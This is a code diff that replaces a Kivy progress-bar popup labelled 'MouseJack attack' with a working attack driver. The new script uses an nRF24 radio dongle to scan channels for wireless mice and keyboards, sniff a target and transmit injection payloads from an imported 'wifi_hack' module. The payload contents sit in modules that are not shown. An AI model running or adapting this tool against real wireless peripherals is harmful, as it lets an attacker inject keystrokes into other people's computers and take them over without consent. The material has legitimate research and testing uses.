@@ -1,43 +1,30 @@
-import kivy
-from kivy.app import App
-from kivy.clock import Clock
-from kivy.uix.popup import Popup
-from kivy.uix.progressbar import ProgressBar
-from kivy.uix.widget import Widget
-from kivy.properties import ObjectProperty
-
-kivy.require("1.9.1")
+from tools import Scanner
+from lib import nrf24_reset, nrf24
+from attacks import wifi_hack
 
 
-class MyPopupProgressBar(Widget):
-    progress_bar = ObjectProperty()  # Kivy properties classes are used when you create an EventDispatcher.
-
-    def __init__(self, **kwa):
-        super(MyPopupProgressBar, self).__init__(
-            **kwa)  # super combines and initializes two widgets Popup and ProgressBar
-        self.progress_bar = ProgressBar()  # instance of ProgressBar created.
-        self.popup = Popup(title='MouseJack attack',
-                           content=self.progress_bar)  # progress bar assigned to popup
-        self.popup.bind(on_open=self.puopen)  # Binds super widget to on_open.
-        Clock.schedule_once(self.progress_bar_start)  # Uses clock to call progress_bar_start() (callback) one time only
-
-    def progress_bar_start(self, instance):  # Provides initial value of of progress bar and lanches popup
-        self.progress_bar.value = 1  # Initial value of progress_bar
-        self.popup.open()  # starts puopen()
-
-    def next(self, dt):  # Updates Project Bar
-        if self.progress_bar.value >= 100:  # Checks to see if progress_bar.value has met 100
-            return False  # Returning False schedule is canceled and won't repeat
-        self.progress_bar.value += 1  # Updates progress_bar's progress
-
-    def puopen(self, instance):  # Called from bind.
-        Clock.schedule_interval(self.next, .5)  # Creates Clock event scheduling next() every 5-1000th of a second.
+def ping_channel(radio, channels):
+    ping = [0x0f, 0x0f, 0x0f, 0x0f]
+    for channel in channels:
+        radio.set_channel(channel)
+        if radio.transmit_payload(ping):
+            break
 
 
-class MyApp(App):
-    def build(self):
-        return MyPopupProgressBar()
-
-
-if __name__ in ("__main__"):
-    MyApp().run()
+if __name__ == '__main__':
+    timeout = int(input())
+    nrf24_reset.reset_radio(0)
+    print("dongle reset...")
+    radio = nrf24.nrf24(0)
+    radio.enter_promiscuous_mode()
+    radio.enable_lna()
+    channels = range(2, 84)
+    devices_list = Scanner.scan(radio, channels, timeout)
+    # print(devices_list['A4:DF:1B:AB:29'])
+    radio.enter_sniffer_mode(devices_list[0][0])
+    ping_channel(radio, channels)
+    wifi_hack = wifi_hack.wifi_hack(devices_list[0][0], radio)
+    wifi_hack.test()
+    for i in wifi_hack.payloads_list:
+        print(i)
+        radio.transmit_payload(i)
